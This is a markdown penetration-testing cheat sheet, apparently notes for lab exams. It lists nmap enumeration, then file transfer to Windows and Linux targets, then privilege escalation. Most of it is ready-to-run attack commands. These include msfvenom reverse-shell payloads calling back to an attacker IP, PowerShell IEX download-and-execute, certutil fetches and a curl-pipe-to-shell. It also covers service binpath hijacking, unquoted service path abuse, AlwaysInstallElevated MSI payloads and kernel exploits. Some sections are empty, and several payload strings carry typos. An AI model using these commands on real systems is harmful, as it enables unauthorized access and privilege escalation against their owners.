## Setting
1.export ip=10.10.10.10\
1.5 make directory for nmap result: mkdir nmap && cd nmap
## Ennumeration
2. `nmap -sC -sV -p- -Pn $ip --open -oN result`   AND  `rustscan -a $IP and rustscan -a $IP`. 
3. Check which ports are open. Take note of service running and versions(for searchsploit)\
4. Manual ennumeration. Visit the open ports to see if we can get initial foothold information. e.g anoymous login, default login,etc\
5. Check for vulnerabiltieis on specific ports using nmap script `nmap -p 80,445,139 --script=*vuln* $IP`
## Check vulnerabilities and enumerate for each port
0. Go to the differnet MD files in the repo.

## Creating a reverseshell, uploading a revershell  / creating a stageless payload
0. `msfvenom -p windows/shell_reverse_tcp LHOST=myIP LPORT=1237 -f exe  -o reverse.exe` 
1. `msfvenom -p windows/shell_reverse_tcp LHOST=myIP LPORT=1234 -f asp -o reverse.asp` 

## File Transfer to Window 

### File transfer via own web server
0. `python3 -m http.server 8080` from linux
1. `powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://myIP:80/winpeas.exe', 'winpeas.exe') -exec bypass` from window
2. `certutil.exe -urlcache -f  http://myIp:80/winpeas.exe` from window
### File Transfer via SMB
0. `mkdir share` and move files to transfer
1. `impacket-smbserver smb share/ ` from linux
2. `net use \\myIP\smb` from window
3. `copy \\myIP\smb\winpeas.exe   \windows\temp\winpeas.exe` 

 ## Privilege Escalation for Window
 0. Use PowerUp
 1. `Import-Module .\PowerUp.ps1` or `. .\PowerUp.ps1`
 2. `Invoke-AllChecks`
 3. or `powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://myIP:80/PowerUp.ps1');Invoke-AllChecks"`
 4. Use WinPeas
 5. `winpeas.exe`
 6. Use SharUp if you cant run winpeas or powerup 
 7. `.\SharpUp.exe`
 ## Service Misconfiguration
- `sc.exe qc <name>` Query the configuration of a service
- `sc.exe query <name>`Query the current status of a service
- `sc.exe config <name> <option>= <value>`Modify a configuration option of a service
`- net start/stop <name>`#Start/Stop a service
### Insecure Service Permissions (Modifileable service)
0. If our user has permission to change the configuration of a service which runs with SYSTEM privileges, we can change the executable the service uses to one of our own.
1. Things to look for (e.g. SERVICE_STOP, SERVICE_START).
2. Things to look for (e.g. SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS)
3. Things to look out for ***Rabit Hole*** If you can change a service configuration but cannot stop/start the service, you may not be able to escalate privileges!
4. `.\winPeas.exe quiet servicesinfo` query for only services
5. `.\accesschk.exe /accepteula -uwcqv user <SERVICENAME>`  confirm with accesscheck that we can change_CONFIG and start service.
6.  `sc qc <SERVICENAME>`  query the service configuration and look at start type, binary path name, dependencies
7.  `sc query <SERVICENAME>` check the current status of the service.
8.  `sc config <SERVICENAME> binpath="\"C:\PrivEsc\reverse.exe\""` set the binary path to the location of the revershell payload. 
9.  Start a netcat listener and `net start <SERVICENAME>`
 ### Unquoted Service Path
 0. `.\winPeas.exe quiet servicesinfo` Look for No quotes and Space detected in winpeas
 1. `Get-UnquotedService` (PowerUp) or `wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """`\ 
 2. `.\accesschk.exe /accepteula -uwcqv user <SERVICENAME>` check permission if we can start the service.
 3. Use accesschk.exe to check for write permissions in each binary path (if BUILTIN/user can write, we should write it in that path)
  ``` 
  > .\accesschk.exe /accepteula -uwdq C:\
  > .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
  > .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
  ```
 6.`msfvenom -p windows/shell_reverse_tcp LHOST=myIP LPORT=LISTENINGPORT -f exe  -o Program.exe` (Name payload accordingly to the path writable)\
 7. `copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"` copy file
 8. start a netcat listenr, and `net start <SERVICENAME>`
 
 ### Weak Registery Permissions




 ### Writable Service Executable
  0.`Invoke-AllChecks`\
  1.`msfvenom -p window/shell_reverse_tcp LHOST=MyIP LPORT=LISTENINGPORT -f exe >service.exe`  (payload name has to be same as writable service) 

 ### AlwaysInstallElevate
 check if both values are 1.\
 0.`reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`\
 1.`reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`\
 2. `msfvenom -p window/shell_reverse_tcp LHOST=MyIP LPORT=LISTENINGPORT -f msi >payload.msi`  (create a payload) 
 3. Transfer payload to Temp and execute
 4. `msiexec /i "C:\Windows\Temp\payload.msi"`


 ### SeImpersonatePrivilege 
 
 
 ### Kernal exploits (last resort)
 0. Extract `systeminfo` and save it to systeminfo.txt in kali (should be in same directory)
 1. `python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | more`
 2. cross reference with the site https://github.com/SecWiki/windows-kernel-exploits to see if we have binaries
 3. Move the binary to window victim and run it with reverseshell to get root. 
 4. open netcat listener 
 5.  `.\x64.exe C:\PrivEsc\reverse.exe`
 
## File Transfer to Linux 
0.`python3 -c 'import pty; pty.spawn("/bin/bash")'` `export TERM=xterm-256color` Stabalize shell \
1.`python3 -m http.server 8080` `or( 80)`
2.`cd /tmp` move directory where we have write access.
4.`wget http://$myIP:8080/linEum.sh .` \
7.Or manually download the latest linpeas https://github.com/carlospolop/PEASS-ng/releases/tag/20221225

## Privilege Escalation for Linux
0. `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh` which would execute script (run from cd /tmp)
1. `chmod +x linpeas.sh` and `./linpeas.sh`


